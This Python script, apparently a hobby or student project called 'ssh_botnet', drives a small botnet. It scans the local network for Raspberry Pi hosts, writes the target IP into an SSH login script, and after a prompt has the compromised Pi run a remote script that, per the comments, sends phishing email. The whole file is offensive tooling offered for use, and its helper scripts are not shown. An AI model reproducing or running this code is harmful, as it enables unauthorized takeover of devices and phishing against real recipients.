import os
import time
from shutil import copyfile

#print out "ssh_botnet"
print("""


	 _         _           _              _   
 ___ ___| |__     | |__   ___ | |_ _ __   ___| |_ 
/ __/ __| '_ \    | '_ \ / _ \| __| '_ \ / _ \ __|
\__ \__ \ | | |   | |_) | (_) | |_| | | |  __/ |_ 
|___/___/_| |_|___|_.__/ \___/ \__|_| |_|\___|\__|
             |_____|                              
""")

"""Function to run script
scanning network for raspi machine by pinging hostname "raspberrypi"
stores discovered target ip address into target.txt"""
def ping():
	os.popen('sh ping.sh')

#invoke scanning function
ping()
time.sleep(10) #gives time to store ip address in target.txt

#open target.txt containing target ip address
f = open("target.txt", "r")
text = ""

#strip off \n character
for line in f:
  stripped_line = line.rstrip()
  text+= stripped_line

#print out ip address in terminal
print("Target found: "+text)
print("\nZombifying target...")
print("\n"+text+" is now part of your botnet army!")

 
# Open and Read file start.sh
with open('start.sh', 'r') as file :
  filedata = file.read()

# Replace the target string with target ip address
filedata = filedata.replace('pi@', "pi@"+text)

# Write the file out again
with open('start.sh', 'w') as file:
  file.write(filedata)

#Start sending out phishing email via botnet
duty = int(input("Press 1 to carry out botnet duties or 0 to cancel: "))
if duty == 1:
	#run start.sh script to auto-login to raspi machine
	#After connection, remote execute local script botnet.sh to send phishing email
	os.popen('sh start.sh')
	print("Mission Completed")
	print("Phishing Email sent!")

	time.sleep(10) #buffer time
	#replace start.sh with default content
	copyfile("backup.sh", "start.sh") 
	#clear contents of target.txt
	f = open('target.txt', 'r+')
	f.truncate(0)

else:
	quit() #end program